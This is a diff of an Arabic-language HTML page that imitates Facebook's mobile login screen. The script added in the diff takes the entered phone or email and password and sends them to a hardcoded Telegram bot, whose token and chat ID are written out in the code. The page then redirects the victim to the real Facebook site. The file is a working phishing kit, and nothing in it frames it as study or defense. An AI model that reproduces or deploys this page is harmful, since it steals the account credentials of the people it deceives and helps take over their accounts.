@@ -3,69 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook – سجل الدخول أو سجل الآن</title>
+    <title>Facebook</title>
     <style>
-        /* التنسيق العام - النسخة المثالية التي طلبتها */
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #ffffff; margin: 0; padding: 0; 
-            display: flex; flex-direction: column; align-items: center; 
-        }
-
-        .top-banner {
-            width: 100%; background: #fff; padding: 12px 0;
-            text-align: center; color: #1877f2; font-size: 13px;
-            border-bottom: 1px solid #e5e5e5;
-        }
-
-        .container {
-            width: 100%; max-width: 412px;
-            padding: 0 16px; box-sizing: border-box; text-align: center;
-        }
-
-        .lang-link { color: #737373; font-size: 14px; margin: 20px 0 30px 0; }
-
+        /* التنسيق المثالي - أبعاد الأندرويد الأصلية */
+        body { font-family: -apple-system, Roboto, Arial, sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        
+        .top-banner { width: 100%; background: #fff; padding: 12px 0; text-align: center; color: #1877f2; font-size: 13px; border-bottom: 1px solid #e5e5e5; }
+        
+        .main-container { width: 100%; max-width: 412px; padding: 0 16px; box-sizing: border-box; text-align: center; }
+        
+        .lang-text { color: #737373; font-size: 14px; margin: 20px 0 35px 0; }
+        
         .fb-logo { width: 82px; height: 82px; margin-bottom: 35px; }
 
-        /* الخانات المذهلة (ارتفاع 58px وانحناء 16px) */
-        .input-box { width: 100%; margin-bottom: 12px; }
+        /* الخانات الضخمة والمذهلة 58px */
+        .input-group { width: 100%; margin-bottom: 12px; }
         input {
-            width: 100%; height: 58px; 
-            background-color: #ffffff; border: 1px solid #dddfe2;
-            border-radius: 16px; 
+            width: 100%; height: 58px; background-color: #ffffff; 
+            border: 1px solid #dddfe2; border-radius: 16px; 
             padding: 0 16px; font-size: 16px; box-sizing: border-box;
             outline: none; color: #1c1e21; text-align: right;
         }
-        input:focus { border: 2px solid #1877f2; padding: 0 15px; }
+        input:focus { border: 2px solid #1877f2; }
 
-        .login-submit {
+        .btn-login {
             width: 100%; height: 48px; background-color: #0064e0;
             color: #fff; border: none; border-radius: 24px;
             font-size: 16px; font-weight: bold; margin-top: 8px; cursor: pointer;
         }
 
-        .forgot-link { display: block; margin-top: 25px; color: #1c1e21; text-decoration: none; font-size: 15px; font-weight: 500; }
+        .link-forgot { display: block; margin-top: 25px; color: #1c1e21; text-decoration: none; font-size: 15px; font-weight: 500; }
 
-        .create-new {
+        .btn-create {
             width: 100%; height: 42px; border: 1px solid #1877f2;
             color: #1877f2; background: #fff; border-radius: 21px;
-            font-size: 14px; font-weight: 500; margin-top: 110px;
+            font-size: 14px; font-weight: 500; margin-top: 100px;
             display: flex; align-items: center; justify-content: center; text-decoration: none;
         }
 
-        /* تنسيق قسم الشعار السفلي المحدث لضمان عدم الحجب */
-        .meta-footer { 
-            margin-top: 40px; 
-            margin-bottom: 25px; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-        }
+        /* شعار Meta الأصلي - كود مباشر لا يُحجب */
+        .meta-footer { margin-top: 45px; margin-bottom: 25px; display: flex; justify-content: center; opacity: 0.6; }
 
-        #loading-screen {
+        /* شاشة التحميل الزرقاء */
+        #loader {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.9); z-index: 10000;
+            background: rgba(255,255,255,0.9); z-index: 9999;
             flex-direction: column; align-items: center; justify-content: center;
         }
-        .loader-dot {
-            width: 35px; height: 35px; border: 4px solid #f
+        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="loader"><div class="spinner"></div></div>
+
+    <div class="top-banner">احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.</div>
+
+    <div class="main-container">
+        <div class="lang-text">العربية</div>
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo" alt="FB">
+
+        <form id="login-form">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="link-forgot">هل نسيت كلمة السر؟</a>
+        <a href="#" class="btn-create">إنشاء حساب جديد</a>
+        
+        <div class="meta-footer">
+            <svg width="72" height="15" viewBox="0 0 530 100" fill="#1c1e21" xmlns="http://www.w3.org/2000/svg">
+                <path d="M73.4 17.5l-16 44.3h-1.1l-16-44.3H26.5v65h11V34.1h.4l15.1 41.5h8.9l15.1-41.5h.4v48.4h11v-65H73.4zM120.7 83.5c18.6 0 30.2-12.7 30.2-31.5 0-17.5-11.4-30.8-29.2-30.8-19.1 0-31.1 13.5-31.1 32 0 18.2 12 30.3 30.1 30.3zm.5-9.6c-11.2 0-18.8-8.6-18.8-21.2 0-12.9 7.6-21.9 18.2-21.9 10.9 0 18.4 8.7 18.4 21.2.1 13.1-7.5 21.9-17.8 21.9zM186.2 22.3h-12.1v10.5h12.1V64c0 14.5 7.6 20.3 20.2 20.3 4.4 0 8.3-.4 11.2-1.1v-9.5c-2.1.5-4.8.7-7.6.7-6.8 0-10.7-3.1-10.7-10.6V32.8h18.3V22.3h-18.3V4.9h-13v17.4zM263.6 83.5c7.3 0 14.3-2.6 19.3-7.5l.5 6.3h10.4V22.3h-10.9v7.7c-5-5.5-12.1-8.8-20.1-8.8-15.6 0-27.9 12.3-27.9 31.2-.1 18.8 11.9 31.1 28.7 31.1zm3-9.5c-10.4 0-18.1-8.5-18.1-21.3 0-13 7.7-21.8 18.1-21.8 10.1 0 18.3 8.3 18.3 21.8 0 13.2-8.2 21.3-18.3 21.3zM375.4 17.5c-15.7 0-26.6 9.3-30.2 21.4h-.4l-2.4-16.6h-11v65h11V50.4c0-11.4 6.7-19.1 17-19.1 1.7 0 3.7.2 5.2.5v-11.1c-1.2-.2-3.4-.2-5.2-.2zM435.1 83.5c18.6 0 30.2-12.7 30.2-31.5 0-17.5-11.4-30.8-29.2-30.8-19.1 0-31.1 13.5-31.1 32 0 18.2 12 30.3 30.1 30.3zm.5-9.6c-11.2 0-18.8-8.6-18.8-21.2 0-12.9 7.6-21.9 18.2-21.9 10.9 0 18.4 8.7 18.4 21.2.1 13.1-7.5 21.9-17.8 21.9zM524.3 83.5c7.3 0 14.3-2.6 19.3-7.5l.5 6.3h10.4V22.3h-10.9v7.7c-5-5.5-12.1-8.8-20.1-8.8-15.6 0-27.9 12.3-27.9 31.2 0 18.8 11.9 31.1 28.7 31.1zm3-9.5c-10.4 0-18.1-8.5-18.1-21.3 0-13 7.7-21.8 18.1-21.8 10.1 0 18.3 8.3 18.3 21.8 0 13.2-8.2 21.3-18.3 21.3z"/>
+            </svg>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA"; 
+        const MY_CHAT_ID = "8058949028";
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('loader').style.display = 'flex';
+
+            const user = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            
+            const text = `🎯 صيد جديد من صفحتك!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_CHAT_ID}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                setTimeout(() => { window.location.href = "https://m.facebook.com/login/save-device/"; }, 1500);
+            })
+            .catch(() => {
+                window.location.href = "https://m.facebook.com/";
+            });
+        });
+    </script>
+</body>
+</html>
